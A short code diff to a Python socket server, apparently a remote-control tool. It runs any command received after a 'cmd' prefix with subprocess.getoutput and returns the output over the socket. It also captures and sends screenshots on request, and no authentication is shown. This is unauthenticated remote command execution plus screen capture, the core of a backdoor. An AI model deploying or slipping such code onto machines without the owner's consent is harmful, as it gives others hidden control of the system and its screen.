@@ -3,7 +3,7 @@ import threading
 import os
 import pyautogui
 import cv2 as cv
-
+import subprocess
 
 HEADER = 64 
 PORT = 5000
@@ -57,10 +57,14 @@ def handleConnection(conn: socket, addr):
             else:
                 if msg[:3] == "cmd":
                     print(f"Remote system running command: {msg[3:]}")
-                    print("Output: ", end="")
-                    os.system(f"{msg[3:]} > cmdout.txt")
-                    with open("cmdout.txt") as f:
-                        conn.send(f.read().encode(FORMAT))
+                    output = subprocess.getoutput(msg[3:])
+                    msg_length = len(output)
+                    msg_length = str(msg_length).encode(FORMAT)
+                    # print(msg_length, output)
+                    msg_length += b" " * (HEADER - len(msg_length))
+                    # print(msg_length)
+                    conn.send(msg_length)
+                    conn.send(output.encode(FORMAT))
                 elif msg == "screenshot":
                     screenshot()
                     temp = open("tempimage.png", "rb")
